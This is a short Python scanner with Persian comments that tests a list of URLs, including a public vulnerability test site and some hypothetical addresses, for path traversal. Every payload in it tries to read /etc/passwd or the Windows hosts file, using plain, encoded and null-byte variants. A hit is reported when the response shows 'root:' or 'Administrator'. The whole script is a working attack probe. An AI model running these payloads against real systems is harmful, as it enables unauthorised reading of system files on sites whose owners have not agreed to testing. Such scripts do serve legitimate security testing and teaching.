import requests

# لیست URLهای مشکوک (این URLها فقط به عنوان مثال هستند و ممکن است در دسترس نباشند)
urls = [
    "http://testphp.vulnweb.com/listproducts.php",  # یک وب‌سایت تست آسیب‌پذیری
    "http://vulnerable-web-app.com/path_traversal",  # URL فرضی
    "http://www.vulnweb.com/dir_traversal",           # URL فرضی
    "http://www.acunetix.com/vulnerabilities/path-traversal/",  # URL فرضی
]

# ورودی‌های آزمایشی برای آسیب‌پذیری Path Traversal
payloads = [
    "../etc/passwd",
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "....//....//....//etc//passwd",
    "file.txt%00",
    "file.txt%00.jpg"
]

# تابع برای تست آسیب‌پذیری
def test_vulnerability(url, payload):
    try:
        response = requests.get(url, params={'file': payload}, timeout=5)
        if response.status_code == 200:
            # بررسی وجود اطلاعات حساس
            if "root:" in response.text or "Administrator" in response.text:
                print(f"[+] Vulnerability found at {url} with payload: {payload}")
            else:
                print(f"[-] No vulnerability found at {url} with payload: {payload}")
        else:
            print(f"[!] Error {response.status_code} for {url} with payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed for {url} with payload: {payload}. Error: {e}")

# اجرای تست‌ها
for url in urls:
    for payload in payloads:
        test_vulnerability(url, payload)
